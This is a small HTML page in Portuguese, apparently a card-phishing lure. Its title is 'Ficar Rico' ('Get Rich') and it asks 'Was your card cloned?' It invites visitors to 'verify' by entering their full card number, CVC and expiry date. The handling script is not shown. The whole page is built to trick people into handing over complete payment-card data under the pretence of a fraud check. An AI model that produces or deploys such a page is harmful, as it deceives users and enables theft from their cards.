<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&family=Roboto:wght@300;400;500&family=Montserrat:wght@400;500;600&family=Lato:wght@300;400;700&family=Raleway:wght@400;500;600&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ficar Rico</title>
</head>
<body>
    <header>
        <h1>Seu cartão foi clonado?</h1>
    </header>
    <div class="center">
        <div class="glass">
            <h3>Insira suas informações</h2>
                <div class="cartao">
                    <input type="number" name="ncartao" id="ncartao" placeholder="   Número do cartão">
                </div>
                <div class="numeros">
                    <input type="number" name="ncvv" id="ncvv" placeholder="    CVC">
                    <input type="number" name="nval" id="nval" placeholder="    Validade">
                </div>
            <div class="botao">
                <input type="button" id="botao" value="Verificar">
            </div>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
